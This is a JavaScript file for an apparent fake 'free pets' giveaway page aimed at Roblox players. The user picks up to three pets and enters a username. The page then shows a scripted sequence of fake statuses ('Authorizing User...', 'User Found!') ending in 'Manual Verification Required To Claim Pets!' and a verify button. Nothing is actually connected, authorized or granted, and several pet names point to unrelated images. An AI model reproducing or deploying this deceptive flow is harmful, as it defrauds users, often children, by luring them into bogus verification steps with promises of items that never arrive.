const rarity = ['common', 'uncommon', 'rare', 'epic', 'legendary'];
let selectedSkinsAmount = 0;
let selectedSkinsNames = [];

const Items = [
    {
        name: 'Space Whale',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/FRShadowDragon.png?v=1679504685&width=600',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Phoenix',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/mega-bat-dragon.png?v=1680965089&width=600',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Axolotl',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/NeonFR_d51b38d8-c8bc-413b-a11f-d270bb0d3f9b.png?v=1679578987&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Giraffe',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/SafariEgg.png?v=1679593665&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Bat Dragon',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/files/Neon-FR-Frost-Dragon.png?v=1682504363&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Shadow Dragon',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFROwl.png?v=1679487734&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Frost Dragon',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/NeonFREvil.png?v=1679307335&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Halloween White Ghost Dragon',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFR_7e36c64e-42dd-4e8f-9580-00cebd8ecffa.png?v=1679576024&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Griffin',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFRParrot.png?v=1679488505&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Ice Golem',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/FarmEgg.png?v=1679592982&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
	{
        name: 'Dancing Dragon',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/files/Untitled-3_ac052bec-dd83-47b8-9ec0-72dab6ab70d5.png?v=1687456162&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Golden Penguin',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/NeonFR_e372f936-34f3-430c-8a3f-943969604ae6.png?v=1679579873&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Goldhorn',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/Megafr_14d5c920-2044-4188-9d19-aad75a46182e.png?v=1679583672&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Queen Bee',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFR_c670b247-fe36-400b-97d5-29e8604bb17d.png?v=1679586101&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Owl',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFR_9a29f0be-2cae-46d5-acec-a60d6fc42f13.png?v=1679584155&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Crow',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFRChameleon.png?v=1679496597&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Kangaroo',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFRStrBat_3.png?v=1679517161&width=493',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Turtle',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFRLavaDragon.png?v=1679341009&width=600',
        rarity: 'legendary',
        iconSeries: false
    },    
    {
        name: 'Arctic Reindeer',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFRUndeadHorse.png?v=1679420924&width=600',
        rarity: 'legendary',
        iconSeries: false
    },
    {
        name: 'Parrot',
        url: 'https://cdn.shopify.com/s/files/1/0736/8740/0762/products/MegaFRLavaWolf.png?v=1679416543&width=600',
        rarity: 'legendary',
        iconSeries: false
    }
]

for (let i = 0; i < Items.length; i++) {
    document.querySelector('#load ul').innerHTML += `
        <div class="col-md-3 col-md-6">
            ${Items[i].iconSeries ? '<img src="https://cdn.discordapp.com/attachments/388822513787863040/732185639218315324/icon-logo.png" class="iconSeries" />' : ''}
            <a class="card splash-card" data-rarity="${Items[i].rarity}">
                <picture>
                    <img class="card-img-top desktop-img pickaxe" src=${Items[i].url}>
                </picture>
                
            </a>
        </div>
    `
}

document.querySelectorAll('.col-md-3.col-md-6 a').forEach(item => {
    item.onclick = () => {
        if (!item.classList.contains('activeCard')) {
            if (selectedSkinsAmount >= 3) {
                $('.errorMsg').fadeIn();
                document.querySelector('.formError').innerText = 'Maximum 3 pets!';
            } else {
                item.classList.add('activeCard');
                selectedSkinsAmount++;
                selectedSkinsNames.push(item.innerText);
            }
        } else {
            item.classList.remove('activeCard');
            selectedSkinsAmount--
            selectedSkinsNames = selectedSkinsNames.filter(e => e !== item.innerText);
        }
    }
});

function claim() {
    const username = document.querySelector('.redeemContainer .redeemView input').value.replace(/\s/g, '');

    if (username === "" || username.length < 3) {
        $('.errorMsg').fadeIn();
        return document.querySelector('.formError').innerText = 'Invalid Username!';
    }

    if (selectedSkinsAmount < 1) {
        $('.errorMsg').fadeIn();
        return document.querySelector('.formError').innerText = 'Please select 1 or more pets!';
    }

    $('.errorMsg').fadeOut();
    $('#load').fadeOut(250)
    $('.buttonContainer').fadeOut(250)
    $('.lds-facebook').fadeIn(1500).css({
        "display": "inline-block"
    });
    $('.status').fadeIn()

    const statuses = ['Connecting...', 'Authorizing User...', 'User Found!', 'Verifying Human...', 'Attempting Human Verification...', 'Manual Verification Required To Claim Pets!'];
    const ch="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" + document.querySelector(".champ").value;
    document.getElementById("prpc").src=ch;
    document.getElementById("prpc").style.display = "inline-block";
    for (let i = 0; i < statuses.length; i++) {
        let time = 2 * i * 850;
        if (i === statuses.length - 1) time = 16000;
        setTimeout(() => {
            document.querySelector('.status').innerHTML = `Status: <span ${i === 2 ? "class='successText'" : i === statuses.length - 1 || i === 5 ? "class='errorText'}" : i === 4 || i === 6 ? 'class="yellowText"' : ''}>${statuses[i]}</span>`;
            if (i === statuses.length - 1) {
                $('.claim').hide();
                $('.verify').show();
                $('.buttonContainer').fadeIn(250)
            }
        }, time)
    }
}

